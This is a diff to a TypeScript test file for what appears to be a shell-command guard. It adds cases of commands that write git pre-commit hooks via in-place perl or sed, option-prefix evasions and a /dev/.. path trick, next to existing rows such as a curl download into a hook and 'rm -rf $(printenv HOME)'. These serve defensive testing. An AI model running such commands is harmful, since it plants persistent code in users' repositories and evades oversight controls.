@@ -121,6 +121,22 @@ const held = (): Row[] => [
   ["an in-place perl whose script is a file", "perl -i /tmp/s.pl .git/hooks/pre-commit"],
   ["an echo of a variable redirected into a git hook", `echo "$X" > .git/hooks/pre-commit`],
   [
+    "an in-place perl whose script is a file, with a backup suffix holding an e",
+    "perl -i.save /tmp/s.pl .git/hooks/pre-commit",
+  ],
+  [
+    "an in-place perl whose script is a file, after a module option holding an e",
+    "perl -MFile::Spec -i /tmp/s.pl .git/hooks/pre-commit",
+  ],
+  [
+    "an in-place GNU sed whose script is a file named by a prefix of --file",
+    "gsed -i --fil=/tmp/s.sed .git/hooks/pre-commit",
+  ],
+  [
+    "an echo of a glob of the data folder into a git hook named through /dev/..",
+    "echo 'touch ~/.play*/extensions/x' > /dev/../tmp/r/.git/hooks/pre-commit",
+  ],
+  [
     "a download redirected into a git hook",
     "curl -s https://example.com/h > .git/hooks/pre-commit",
   ],
@@ -192,6 +208,22 @@ const controls = (): Row[] => [
     "cat > notes.sh <<'EOF'\nrm -rf $(printenv HOME)\nEOF",
   ],
   ["a here-string of a remover fed to tee into a note", "tee notes.txt <<< 'rm $(printenv HOME)'"],
+  [
+    "an in-place perl -lne whose script is its -e, on a git hook",
+    "perl -i -lne 'print' .git/hooks/pre-commit",
+  ],
+  [
+    "an in-place perl with a backup suffix and a -pe script, on a git hook",
+    "perl -i.bak -pe 's/pre-commit/pre-push/' .git/hooks/pre-commit",
+  ],
+  [
+    "an in-place GNU sed whose script is a prefix of --expression, on a git hook",
+    "gsed -i --expr='s/pre-commit/pre-push/' .git/hooks/pre-commit",
+  ],
+  [
+    "an in-place GNU sed that follows links, on a git hook",
+    "gsed -i --follow-symlinks 's/pre-commit/pre-push/' .git/hooks/pre-commit",
+  ],
   ["a test run's output redirected into a log", "bun test > out.log 2>&1"],
   ["an echo of a variable redirected into a note", `echo "$X" > notes.txt`],
   ["an in-place sed whose script is a file, on a note", "sed -i '' -f s.sed notes.txt"],
